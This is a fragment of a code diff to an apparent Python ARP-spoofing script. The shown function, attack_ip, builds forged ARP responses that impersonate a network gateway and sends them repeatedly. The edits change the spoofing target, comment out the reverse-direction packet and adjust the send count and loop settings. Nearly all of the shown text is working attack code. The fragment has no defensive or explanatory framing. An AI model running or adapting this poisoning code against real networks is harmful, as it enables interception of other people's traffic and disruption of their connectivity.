@@ -52,10 +52,10 @@ def attack_ip(ip, delay): #both sides
 
     # create packs
     macGW = find_mac_by_ip(ipGW)
-    pck = [create_arp_response_packet(args.target, macSrc, ipGW, macGW)]  # create a list with one packet
-    pck.append(create_arp_response_packet(ipGW, macSrc, args.target, macVic))
+    pck = [create_arp_response_packet(ip, macSrc, ipGW, macGW)]  # create a list with one packet
+  #  pck.append(create_arp_response_packet(ipGW, macSrc, ip, macVic))
 
-    send(pck, inter=delay, loop=1)
+    send(pck,count=50, inter=delay, loop=1)
 
 
 def main():
@@ -74,7 +74,7 @@ def main():
     else:
         pck=create_arp_response_packet(ipGW,myMac,args.target,macVic)
 
-    send(pck,inter=args.delay,loop=1)   
+    send(pck,inter=args.delay,loop=2)
 
 
 if __name__=="__main__":
